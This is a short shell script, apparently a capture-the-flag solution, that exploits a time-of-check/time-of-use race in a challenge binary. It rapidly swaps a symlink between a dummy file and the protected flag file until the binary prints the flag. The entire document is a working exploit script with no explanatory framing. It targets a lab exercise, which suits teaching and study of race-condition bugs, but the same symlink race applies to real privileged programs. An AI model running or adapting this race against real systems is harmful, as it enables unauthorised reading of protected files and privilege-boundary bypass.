#!/bin/sh

# Setup
VULN="/challenge/challenge"
FLAG="/challenge/flag"
DUM=$(mktemp -u XXXXXXXXXX)
PTR=$(mktemp -u XXXXXXXXXX)
OUT=$(mktemp -u XXXXXXXXXX)
iAtt=0

> $DUM
# Attempts to Read $FLAG
while true
do
    iAtt=$((iAtt + 1))
    ln -sf $DUM $PTR
    echo $PTR | $VULN > $OUT &
    ln -sf $FLAG $PTR

    if grep -q "SSof" $OUT
    then
        cat $OUT
        echo "Success Attempt $iAtt!"
        break
    fi
    echo "Failed Attempt $iAtt!"
done

# Cleanup
rm $DUM $OUT
